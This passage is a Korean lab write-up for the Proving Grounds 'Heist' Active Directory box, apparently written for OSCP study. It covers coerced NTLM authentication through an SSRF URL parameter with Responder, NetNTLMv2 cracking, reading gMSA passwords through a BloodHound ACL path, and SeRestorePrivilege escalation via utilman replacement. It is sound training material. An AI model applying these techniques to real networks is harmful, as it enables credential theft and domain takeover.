---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/ssrf
  - tech/ad/ntlm-relay
  - tech/cred/crack
  - tech/ad/bloodhound
  - tech/ad/acl-abuse
  - tech/ad/pth
  - tech/exec/winrm
  - tech/win/serestore
  - tech/svc/smb
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.120.165
domain: heist.offsec
ports: [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 8080, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn]
status: solved
manual_tags: true
manual_cves: true
tech_count: 10
---
> [!info] PG Practice — **Advanced** · 단일 DC Active Directory 박스
> **타겟** 192.168.120.165 · **OS** Windows Server 2019 Standard (build 17763, `DC01.heist.offsec`) · **난이도** Advanced · **플래그 2개**
> **경로 요약** 8080 "Secure Web Browser"의 **`?url=` 서버측 페치**로 Kali의 Responder에 인증 강제 → `HEIST\enox` **NetNTLMv2 캡처** → hashcat `-m 5600` 크랙(`california`) → WinRM 셸 → BloodHound에서 **`enox → WEB ADMINS → ReadGMSAPassword → svc_apache$`** 확인 → gMSA NT 해시 읽기 → **PtH**로 `svc_apache$` 셸 → **SeRestorePrivilege** 악용(utilman 치환 / SeRestoreAbuse) → SYSTEM

> [!warning] 이 노트를 읽는 규약 — 실측과 재구성을 구분하라
> 이 노트의 터미널 블록은 두 종류다.
> - **실측** — Kali 산출물 `~/PG/Heist/`(`nmap.log` · `hash.txt` · BloodHound JSON 7종 · feroxbuster `.state`), `~/.zsh_history`, hashcat potfile, 그리고 원본 노트에 붙어 있던 스크린샷. **BloodHound JSON은 `jq`로 직접 열어 대조했다** — 이 노트의 ACL 서술은 그래프 스크린샷이 아니라 원본 JSON이 1차 근거다.
> - **미실행** — 코드펜스 밖 산문으로만 적었고 "관측된 것이 아니다"를 그 자리에 명시했다.
>
> `svc_apache$`가 **왜** SeRestorePrivilege를 가졌는지는 BloodHound가 수집하지 않는 정보(User Rights Assignment)라 `[가정]`으로 표시했다.

## 0. 이 박스에서 배우는 것

- **웹앱의 "URL을 넣으세요"는 AD에서 자격증명 유출구다** — SSRF가 데이터 유출이 아니라 **강제 인증(coerced authentication)** 으로 이어진다. Windows 프로세스가 HTTP 401 + `WWW-Authenticate: NTLM`을 만나면 **자기 로그온 세션의 자격증명으로 자동 응답**한다
- **NetNTLMv2는 "릴레이"와 "크랙"이 갈린다** — SMB 서명이 필수면 릴레이는 죽고 크랙만 남는다. **어느 쪽인지 판정하는 근거가 nmap 한 줄에 있다**
- **gMSA(그룹 관리 서비스 계정)의 비밀번호는 LDAP 속성 하나로 읽힌다** — `msDS-ManagedPassword`. 단, `msDS-GroupMSAMembership`에 등재된 principal만. **BloodHound의 `ReadGMSAPassword` 엣지가 정확히 이것이다**
- **`SeRestorePrivilege`는 SYSTEM으로 가는 두 갈래 길** — 파일 계열(`utilman.exe` 치환 → RDP 로그인 화면) / 레지스트리 계열(서비스 ImagePath 하이재킹)
- **NTLM 크랙 결과를 4개 프로토콜에 한 번에 던지는 습관** — SMB·WinRM·RDP·MSSQL. 시험 AD 세트에서 이 스윕이 피벗의 출발점이다

> [!tip] 시험 출제 가능성
>
> | 요소 | 출제 가능성 | 이유 |
> |---|---|---|
> | **강제 인증 → NetNTLMv2 캡처 → 크랙** | **매우 높음** | 시험 AD 세트의 정석 진입로 중 하나다. 트리거가 웹 `?url=`이든, 쓰기 가능한 SMB 공유([[Vault]])든, 프린터 버그(PetitPotam/PrinterBug)든 **뒤 단계는 동일**하다 |
> | **gMSA 비밀번호 읽기** | 중간 | `svc_*$`로 끝나는 계정이 `CN=Managed Service Accounts`에 보이면 즉시 의심한다. 시험에 나오면 **이 한 줄을 모르면 그 자리에서 막힌다** |
> | **`SeRestorePrivilege` / `SeBackupPrivilege`** | **매우 높음** | Windows 셸을 잡으면 `whoami /priv`가 첫 명령이다. 특권 이름 하나가 곧 경로다 |
> | **BloodHound 최단경로 읽기** | **매우 높음** | AD 세트는 "어떤 계정으로 무엇을 할 수 있나"를 그래프로 못 읽으면 시간이 녹는다. **BloodHound는 열거 도구라 시험에서 허용된다** |
>
> 변형은 이런 모습이다 — `?url=` 대신 이미지 프록시/PDF 렌더러/웹훅 테스트 폼, gMSA 대신 LAPS(`ms-Mcs-AdmPwd`), `SeRestore` 대신 `SeBackup`·`SeTakeOwnership`. **원리는 동일하다.**

> [!note] OSCP 시험 규정 — 이 박스에서 쓴 도구는 전부 허용된다
> - **BloodHound / bloodhound-python / SharpHound** — 열거 전용. 익스플로잇 단계가 없어 **허용**
> - **NetExec(nxc) / CrackMapExec** — 열거·인증 확인. **허용**
> - **Responder** — 프로토콜 포이즈닝·자격증명 수집. **허용**
> - **hashcat / evil-winrm / bloodyAD / GMSAPasswordReader** — **허용**
> - **금지는 `sqlmap` 계열 자동 익스플로잇과 Nessus/OpenVAS 계열 대량 스캐너다.** Metasploit은 금지가 아니라 **1대 한정**이고, `msfvenom`·`multi_handler`는 전 대상 허용이다. 이 박스는 Metasploit 없이 끝난다

---

## 1. 정찰

### 1-1. Nmap — AD 지문을 한 눈에 읽는 법

`nnmap`은 오타가 아니라 별칭이다 (`~/.zshrc:247`):

```bash
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ nnmap 192.168.120.165
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 13:56 +0900
Nmap scan report for 192.168.120.165
Host is up (0.084s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 04:56:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-08T04:58:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2026-07-07T04:55:18
|_Not valid after:  2027-01-06T04:55:18
| rdp-ntlm-info:
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T04:57:37+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-08T04:57:39
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   83.50 ms 192.168.45.1
2   83.37 ms 192.168.45.254
3   83.82 ms 192.168.251.1
4   83.90 ms 192.168.120.165

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.39 seconds
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | **8080을 놓칠 위험은 없다** — 8080은 `nmap-services`에 등재돼 있어 기본 top-1000에도 들어간다. `-p-`가 실제로 벌어주는 것은 **고번호 RPC 포트(49666~49704)** 다. 다른 박스에서는 이 대역이 유일한 웹 포트일 수 있다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `rdp-ntlm-info`·`ssl-cert`·`smb2-security-mode`가 통째로 사라진다. **이 박스에서 도메인 FQDN·DC 호스트명·SMB 서명 정책이 전부 이 세 스크립트에서 나온다** |
| `-Pn` | ping 사전 탐지 생략 | Windows 방화벽은 기본적으로 ICMP echo를 막는다. 빼면 "호스트 다운"으로 오판하고 스캔 자체를 안 한다 |
| `-A` | OS 추측 + traceroute | 버전 판정의 **독립 근거 하나**가 사라진다. 여기서는 `ssl-cert`의 `commonName=DC01.heist.offsec`과 `rdp-ntlm-info`의 `Product_Version: 10.0.17763`이 서로를 교차 검증한다 |
| `--min-rate 5000` | 초당 최소 패킷 | 65535 포트 전수가 수십 분 → **132초**. 24시간 시험에서 이 한 줄이 시간을 만든다 |
| `-oN nmap.log` | 사람이 읽는 포맷 저장 | 재실행 없이 다시 본다. 이 노트의 모든 정찰 서술이 이 파일 하나에서 나왔다 |

> [!note] AD 도메인 컨트롤러의 포트 지문 — 이 조합을 외워라
> `53`(DNS) + `88`(Kerberos) + `389`/`636`(LDAP/LDAPS) + `3268`/`3269`(Global Catalog) + `445`(SMB) + `464`(kpasswd) + `9389`(AD Web Services).
> **이 셋 이상이 한 호스트에 같이 있으면 그것은 DC다.** 특히 `3268`(Global Catalog)은 **DC에만** 뜬다 — 도메인 가입 멤버 서버에는 없다.
>
> 여기에 `5985`(WinRM)까지 열려 있다 → **자격증명 하나만 얻으면 바로 대화형 셸**이다. `evil-winrm`이 붙는다.

> [!danger] `Message signing enabled and required` — 이 한 줄이 공격 전략을 갈랐다
> ```
> | smb2-security-mode:
> |   3.1.1:
> |_    Message signing enabled and required
> ```
> **DC는 SMB 서명이 기본 필수다.** 그래서 이 박스에서 NetNTLMv2를 잡아도 **SMB로 릴레이할 수 없다.**
> 릴레이가 죽으면 남는 길은 **오프라인 크랙**뿐이다. §2-4에서 이 판정의 근거를 자세히 본다.
>
> 반대로 `enabled but not required`가 보이면 **그때가 `ntlmrelayx`를 꺼낼 때**다. 스캔 결과의 이 한 줄을 보지 않고 릴레이부터 시도하면 시간을 태운다.

### 1-2. 8080 — "Super Secure Web Browser"

`http-title: Super Secure Web Browser`. Werkzeug 2.0.1 / Python 3.9.0 → **Flask 앱**이다.

![[Pasted image 20260708140815.png]]

화면에는 `Enter URL` 입력창 하나뿐이다. **AD 박스에서 "URL을 넣으세요"는 SSRF가 아니라 자격증명 유출구로 읽어야 한다.**

파라미터 이름을 확인하려고 아무 값이나 넣어봤다 — 주소창이 `?url=a`로 바뀐다:

![[Pasted image 20260708140840.png]]

**파라미터는 `url` 하나. GET이다.** 반환된 것은 Chromium 오프라인 오류 페이지를 흉내낸 테마 페이지였다 — 즉 **서버가 그 URL을 실제로 가져오려 시도했고 실패했다**는 뜻이다. 유효하지 않은 호스트 `a`를 넘겼으니 당연하다.

> [!tip] 여기서 판단해야 할 것은 딱 하나 — "누가 그 요청을 보내는가"
> 브라우저가 보내면 클라이언트측 리디렉트일 뿐 쓸모가 없다. **서버가 보내면** 그 요청은 **DC 위에서, DC의 로그온 세션 컨텍스트로** 나간다.
> 판별법은 간단하다 — **내 Kali를 가리키고 리스너를 띄운다.** 요청이 오면 서버측이고, 소스 IP가 타겟 IP다.

### 1-3. 디렉터리 브루트포싱 — 완주하고 0건 (막다른 길)

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ feroxbuster -u http://192.168.120.165:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt
```

중단 시점의 재개용 상태파일 `ferox-http_192_168_120_165_8080_-1783487413.state`가 남아 있다. 파싱하면 결과가 그대로 나온다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ python3 -c "
import json
d=json.load(open('ferox-http_192_168_120_165_8080_-1783487413.state'))
print(d['scans'][0]['requests_made_so_far'], '/', d['scans'][0]['num_requests'])
for x in d['responses']: print(x['status'], x['content_length'], x['url'])"
148104 / 622887
200 3608 http://192.168.120.165:8080/
```

**148,104개 요청을 던져 얻은 것은 루트 `/` 하나(200, 3608 bytes)다.** 숨은 엔드포인트는 없었다.

> [!warning] 단일 파라미터 앱에 디렉터리 브루트포싱은 헛수고다
> 화면에 입력창이 하나 있고 그것이 `?url=`로 반영된다면 **공격면은 이미 눈앞에 다 있다.** 62만 요청짜리 워드리스트를 돌리기 전에 그 파라미터를 먼저 만져라.
> 같은 교훈이 [[Exghost]]에도 있다 — 30만 건 완주 0건. **워드리스트에 없는 이름은 브루트포싱으로 안 나온다.**

---

## 2. 취약점 분석

### 2-1. 배경 — Windows "강제 인증"이란 무엇인가

Windows에서 클라이언트가 서버에 접속했을 때 서버가 이렇게 답하면:

- HTTP: `401 Unauthorized` + `WWW-Authenticate: NTLM`
- SMB: 세션 셋업 단계에서 NTLMSSP 협상

Windows 클라이언트는 **사용자에게 아무것도 묻지 않고**, 현재 로그온 세션의 자격증명으로 NTLM 챌린지·리스폰스를 수행한다. 이것이 SSO의 설계 의도다. 도메인 환경에서는 편의 기능이고, **공격자가 서버 역할을 맡으면 자격증명 유출구**가 된다.

여기서 나가는 것은 **비밀번호도, NT 해시도 아니다.** 나가는 것은 `NTProofStr` — 서버가 준 챌린지에 **NT 해시를 키로 HMAC-MD5를 건 결과**다. 그래서 이 값은 그대로 재사용할 수 없고, 두 가지 중 하나로만 쓸 수 있다:

| 쓰는 법 | 조건 | 이 박스에서 |
|---|---|---|
| **릴레이** — 받은 챌린지·리스폰스를 다른 서버에 그대로 중계 | 대상 프로토콜에 **서명/채널 바인딩이 없어야** 한다 | ❌ SMB 서명 필수 (§2-4) |
| **오프라인 크랙** — 후보 비밀번호로 NT 해시를 만들어 HMAC을 재계산, `NTProofStr`과 비교 | **비밀번호가 약해야** 한다 | ✅ `california` (rockyou 4096번째 후보) |

### 2-2. 왜 `?url=`이 도메인 자격증명을 뱉는가

이 앱은 사용자가 넣은 URL을 **서버측에서 가져와** 렌더 결과를 돌려준다. 그 페치를 수행하는 프로세스는 `HEIST\enox`의 로그온 세션에서 돌고 있었다 — Responder가 잡은 사용자 이름이 그 증거다.

공격 순서는 이렇다:

1. Responder를 `tun0`에 띄운다. Responder의 **HTTP 서버가 기본 On**이다 (아래 §3-1에서 배너로 확인)
2. `?url=http://192.168.45.175` 를 넣는다
3. DC의 페치 프로세스가 Kali:80에 GET을 보낸다
4. Responder가 `401 + WWW-Authenticate: NTLM`으로 답한다
5. 페치 프로세스가 **자동으로** `HEIST\enox`의 NTLMv2 리스폰스를 보낸다
6. Responder가 그것을 `enox::HEIST:...` 형식으로 찍는다

> [!danger] 이 인과를 **추측이 아니라 증거로** 확정할 수 있다 — AV_PAIR의 `MsvAvTargetName`
> 캡처한 NetNTLMv2 blob 안에는 클라이언트가 **어느 서비스에 인증하려 했는지**가 들어 있다. `~/PG/Heist/hash.txt`를 직접 디코드했다:
>
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ python3 - <<'EOF'
> import binascii,struct
> p=open('hash.txt').read().strip().split(':')
> print('user=',p[0],'domain=',p[2],'challenge=',p[3])
> print('NTProofStr=',p[4])
> b=binascii.unhexlify(p[5]); i=28
> while i+4<=len(b):
>     aid,alen=struct.unpack('<HH',b[i:i+4]); i+=4
>     v=b[i:i+alen]; i+=alen
>     if aid==0: break
>     if aid==9: print('MsvAvTargetName =',v.decode('utf-16le'))
> EOF
> user= enox domain= HEIST challenge= a9a24c7373e7eaf6
> NTProofStr= 812295EA02430380A3C69B6C8CD67A27
> MsvAvTargetName = HTTP/192.168.45.175
> ```
>
> **`HTTP/192.168.45.175`** — 인증이 **HTTP로** 왔다. SMB가 아니다. 즉 UNC 경로 트릭이 아니라 **웹 페치가 트리거**였음이 blob 자체로 증명된다.
> 대조 실험: [[Vault]]의 같은 위치는 **`cifs/192.168.45.175`** 다 — 그쪽은 SMB 공유가 트리거였다. **한 필드로 진입 벡터가 갈린다.**

### 2-3. NetNTLMv2 해시를 필드 단위로 해부한다

`hash.txt`의 실제 값을 콜론으로 자르면 이렇다:

| 필드 | 값 | 정체 |
|---|---|---|
| `enox` | 사용자명 | 크랙 후 그대로 쓸 계정 |
| (빈칸) | LM 필드 | NTLMv2에서는 비어 있다 |
| `HEIST` | 도메인(NetBIOS) | **HMAC 입력에 들어간다** — 대소문자·형태가 바뀌면 크랙이 실패한다 |
| `a9a24c7373e7eaf6` | **서버 챌린지** | Responder가 만든 8바이트. `Challenge = Random`이 기본값 |
| `812295EA...67A27` | **NTProofStr** | HMAC-MD5(NTLMv2Hash, 서버챌린지‖blob). **크랙이 맞춰야 할 값** |
| `0101000000000000...` | **blob** | 타임스탬프 + 클라이언트 챌린지 + AV_PAIR 목록. HMAC 입력에 통째로 들어간다 |

크랙 알고리즘은 이렇다 — 후보 비밀번호 `p`에 대해
`NTHash = MD4(UTF16LE(p))` → `NTLMv2Hash = HMAC-MD5(NTHash, UTF16LE(USER.upper() + DOMAIN))` → `HMAC-MD5(NTLMv2Hash, 챌린지‖blob)` 가 `NTProofStr`과 같으면 정답.

> [!warning] 그래서 해시를 **한 글자도 편집하면 안 된다**
> 사용자명·도메인·blob이 전부 HMAC 입력이다. 줄바꿈이 끼거나 도메인을 `heist.offsec`(FQDN)으로 바꿔 적으면 **정답 비밀번호를 넣어도 크랙이 실패한다.**
> Responder 출력에서 `[HTTP] NTLMv2 Hash :` 뒤의 **한 줄 전체**를 그대로 파일에 넣어라.

**hashcat 모드 대응표** — Kali에서 `hashcat -hh`로 직접 확인한 원문이다:

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -hh | grep -E "^\s+(5500|5600|13100|18200|19700|1000)\s"
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
   1000 | NTLM                                                       | Operating System
```

| 얻은 것 | 모드 | 언제 나오는가 |
|---|---|---|
| Responder / 강제 인증 결과 | **`-m 5600`** | 이 박스 |
| **AS-REP** (`GetNPUsers`) | **`-m 18200`** | 계정에 `DONT_REQ_PREAUTH`가 켜져 있을 때 |
| **TGS-REP** (`GetUserSPNs`, Kerberoasting) | **`-m 13100`** (RC4) / `-m 19700` (AES256) | 계정에 SPN이 붙어 있을 때 |
| NT 해시 (secretsdump 등) | `-m 1000` | 이미 크랙할 필요 없이 PtH로 쓴다 |

> [!note] AS-REP 로스팅과 Kerberoasting이 **왜** 크랙 가능한 물건을 뱉는가
> **AS-REP(`-m 18200`)** — 정상 Kerberos는 AS-REQ에 **사전인증(pre-authentication)** 을 요구한다. 클라이언트가 현재 시각을 **자기 비밀번호 파생 키로 암호화**해 보내야 KDC가 AS-REP을 준다. 비밀번호를 모르면 그 암호문을 못 만들므로 KDC는 아무것도 돌려주지 않는다.
> 그런데 계정에 `DONT_REQ_PREAUTH` 플래그가 켜져 있으면 KDC는 **아무 검증 없이 AS-REP을 발급**한다. 그 AS-REP의 일부가 **사용자 키로 암호화**돼 있으므로, 그 조각이 곧 오프라인 크랙 대상이 된다. **비밀번호를 몰라도 인증 없이 받아낼 수 있다는 것이 핵심**이다.
> **TGS-REP(`-m 13100`)** — 도메인 사용자면 **누구나** 임의 SPN의 TGS를 요청할 수 있다. 그 TGS의 티켓 부분은 **SPN이 걸린 서비스 계정의 키로 암호화**된다. 서비스 계정 비밀번호가 사람이 정한 문자열이면 크랙된다. **컴퓨터 계정(`...$`)과 gMSA는 120자 랜덤이라 크랙 불가** — 그래서 이 박스의 `svc_apache$`는 Kerberoasting 대상이 아니었다(§6-2).

### 2-4. 왜 릴레이가 아니라 크랙이었나 — 판정 근거

`impacket-ntlmrelayx`를 실제로 시도했다(§6-4). 결론부터: **이 박스에서는 무의미하다.**

| 릴레이 대상 | 이 박스의 상태 | 근거 |
|---|---|---|
| SMB(445) | **서명 필수** | `nmap.log` → `smb2-security-mode: 3.1.1: Message signing enabled and required` |
| LDAP(389) / LDAPS(636) | DC 기본 정책상 봉인·채널 바인딩 요구 | 관측된 것이 아니다 — Server 2019 DC의 일반적 기본값이다 `[가정]` |
| **자기 자신에게 릴레이** | 원천 차단 | MS16-075 이후 **동일 호스트로의 NTLM 릴레이는 커널이 거부**한다. 이 박스는 호스트가 하나뿐이므로 릴레이할 "다른 서버"가 애초에 없다 |

**세 번째 이유가 결정적이다.** 이 랩은 **DC 한 대짜리 단일 호스트 도메인**이다(BloodHound `computers.json`에 `DC01.HEIST.OFFSEC` 하나뿐). 릴레이는 "A가 나에게 인증한 것을 B에게 넘기는" 공격인데 **B가 존재하지 않는다.**

> [!tip] 릴레이 가능 여부는 3초 만에 판정한다
> 1. `nmap`의 `smb2-security-mode`가 `enabled and required`인가? → 그러면 SMB 릴레이 죽음
> 2. `nxc smb <대역> --gen-relay-list targets.txt` 로 **서명이 꺼진 호스트**를 뽑는다 (관측된 것이 아니다 — 이 박스에서는 실행하지 않았다)
> 3. 넘길 호스트가 **한 대도 없으면** 릴레이는 포기하고 **크랙으로 간다**
>
> 반대로 시험 AD 세트처럼 **멤버 서버가 여러 대**면 릴레이가 훨씬 강력하다 — 크랙 불가능한 컴퓨터 계정 인증도 릴레이는 그대로 쓴다.

### 2-5. gMSA — 비밀번호가 LDAP 속성 하나로 읽히는 계정

BloodHound JSON에서 `svc_apache$`의 위치를 먼저 확인한다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name=="SVC_APACHE$@HEIST.OFFSEC") | .Properties.distinguishedname' 20260708141821_users.json
CN=SVC_APACHE,CN=MANAGED SERVICE ACCOUNTS,DC=HEIST,DC=OFFSEC
```

**`CN=Managed Service Accounts`** — 이 컨테이너에 있으면 gMSA다.

> [!note] gMSA(Group Managed Service Account)의 동작
> - 비밀번호를 **관리자가 정하지 않는다.** DC가 **KDS root key**에서 계정별로 파생해 만들고, 기본 **30일마다 자동 롤**한다. 길이는 **240바이트(유니코드 120자)** 라 사전 크랙이 불가능하다
> - 비밀번호는 `msDS-ManagedPassword`라는 **계산된(constructed) 속성**으로 LDAP에서 조회된다. 디스크에 그 이름으로 저장돼 있는 것이 아니라 **요청 시점에 DC가 만들어 준다**
> - 누가 읽을 수 있는지는 `msDS-GroupMSAMembership`(= `PrincipalsAllowedToRetrieveManagedPassword`) 보안 서술자가 정한다
> - **BloodHound의 `ReadGMSAPassword` 엣지가 정확히 이 속성을 읽어 만든 것이다**
>
> 즉 **gMSA는 "크랙할 수 없지만 읽을 수는 있는" 계정**이다. 크랙을 포기하고 **ACL을 봐야 한다**는 신호다.

### 2-6. 왜 하필 `enox`였나 — JSON이 답을 준다

`svc_apache$`에 걸린 ACE를 원본 JSON에서 직접 뽑았다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name=="SVC_APACHE$@HEIST.OFFSEC")
           | .Aces[] | select(.RightName=="ReadGMSAPassword")
           | [.RightName,.PrincipalSID,.PrincipalType,.IsInherited] | @tsv' 20260708141821_users.json
ReadGMSAPassword	S-1-5-21-537427935-490066102-1511301751-1000	Computer	false
ReadGMSAPassword	S-1-5-21-537427935-490066102-1511301751-1104	Group	false
```

두 principal뿐이다. `-1000`은 DC01 자신(컴퓨터 계정)이고, `-1104`가 남은 하나다. 정체를 확인한다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1104")
           | [.Properties.name, (.Members[].ObjectIdentifier)] | @tsv' 20260708141821_groups.json
WEB ADMINS@HEIST.OFFSEC	S-1-5-21-537427935-490066102-1511301751-1103

┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1103")
           | [.Properties.samaccountname, .Properties.distinguishedname] | @tsv' 20260708141821_users.json
enox	CN=NAQI,CN=USERS,DC=HEIST,DC=OFFSEC
```

**`WEB ADMINS` 그룹의 유일한 멤버가 `enox`다.** 경로가 이것으로 확정된다:

```
ENOX  --MemberOf-->  WEB ADMINS  --ReadGMSAPassword-->  SVC_APACHE$
```

BloodHound GUI에서도 같은 그래프가 나온다:

![[Pasted image 20260708150543.png]]

> [!warning] `CN=NAQI` — DN의 CN과 `sAMAccountName`은 다를 수 있다
> 이 계정의 DN은 `CN=NAQI`인데 실제 로그인 이름은 `enox`다. **인증에 쓰는 것은 `sAMAccountName`(`enox`)이다.**
> `ldapsearch`·`net rpc`·수동 열거로 사용자 목록을 뽑을 때 CN만 긁으면 **로그인이 전부 실패**한다. 반드시 `sAMAccountName`을 뽑아라.

`enox`가 왜 WinRM으로 바로 들어갔는지도 JSON에 있다:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name=="REMOTE MANAGEMENT USERS@HEIST.OFFSEC")
           | .Members[].ObjectIdentifier' 20260708141821_groups.json
S-1-5-21-537427935-490066102-1511301751-1105
S-1-5-21-537427935-490066102-1511301751-1103
```

`-1103`(enox)과 `-1105`(svc_apache$) **둘 다 Remote Management Users**다. 그래서 두 계정 모두 `evil-winrm`이 붙는다.

> [!danger] nxc의 WinRM `(Pwn3d!)`는 **관리자라는 뜻이 아니다** — 소스로 확인했다
> §3-4의 스윕에서 `WINRM ... heist.offsec\enox:california (Pwn3d!)` 가 나온다. 그런데 BloodHound상 `enox`는 `Administrators`의 멤버가 **아니다**:
> ```bash
> ┌──(kali㉿kali)-[~/PG/Heist]
> └─$ jq -r '.data[] | select(.Properties.name=="ADMINISTRATORS@HEIST.OFFSEC") | .Members[].ObjectIdentifier' 20260708141821_groups.json
> S-1-5-21-537427935-490066102-1511301751-512     # Domain Admins
> S-1-5-21-537427935-490066102-1511301751-519     # Enterprise Admins
> S-1-5-21-537427935-490066102-1511301751-500     # Administrator
> ```
> 모순처럼 보이지만 아니다. Kali의 nxc 소스를 열어보면 이유가 명확하다:
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ sed -n '122,134p' /usr/lib/python3/dist-packages/nxc/protocols/winrm.py
>     def check_if_admin(self):
>         wsman = self.conn.wsman
>         wsen = NAMESPACES["wsen"]
>         wsmn = NAMESPACES["wsman"]
>
>         enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
>         ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
>         ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"
>
>         wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
>         self.admin_privs = True
>         return True
> ```
> **`admin_privs = True`를 무조건 대입하고 반환한다.** `wsman.enumerate()`의 결과를 보지 않는다.
> 결론: **WinRM 줄의 `(Pwn3d!)`는 "WinRM 인증이 됐다 = 셸을 얻을 수 있다"는 뜻일 뿐**이다. 관리자 판정으로 읽으면 그 다음 30분을 "왜 `proof.txt`가 안 읽히지"에 태운다.
> **SMB 줄의 `(Pwn3d!)`는 다르다** — 그쪽은 `ADMIN$` 접근 성공을 실제로 확인한다.

### 2-7. `SeRestorePrivilege` — 왜 이것이 SYSTEM인가

`svc_apache$`의 특권 목록(§4-3 실측)에 `SeRestorePrivilege`가 **Enabled** 상태로 있다.

이 특권의 설계 의도는 "백업 소프트웨어가 복원할 때 파일 DACL을 무시하고 덮어쓸 수 있게" 하는 것이다. 그 결과 보유자는 **`%SystemRoot%\System32` 같은 ACL로 보호된 위치에도 쓰기·삭제·이름변경이 가능**해진다. 레지스트리 쪽 대응물은 `SeBackupPrivilege`/`SeRestorePrivilege`가 `HKLM` 보호 키에 대해 갖는 같은 성질이다.

여기서 두 갈래가 나온다:

| 경로 | 건드리는 객체 | SYSTEM이 되는 이유 |
|---|---|---|
| **A. `utilman.exe` 치환** | 파일 (`C:\Windows\System32\utilman.exe`) | RDP **로그인 화면**의 접근성 버튼은 로그온 전이라 **`NT AUTHORITY\SYSTEM`으로 실행**된다. 그 실행 파일을 `cmd.exe`로 바꿔치기하면 로그인 화면에서 SYSTEM 콘솔이 열린다 |
| **B. `SeRestoreAbuse.exe`** | 레지스트리 (서비스 설정 키) | 서비스의 실행 경로를 내 페이로드로 바꾸고 그 서비스를 시작시킨다. 서비스는 **LocalSystem**으로 뜬다 |

> [!danger] 경로 A의 숨은 전제조건 — **NLA가 꺼져 있어야 한다**
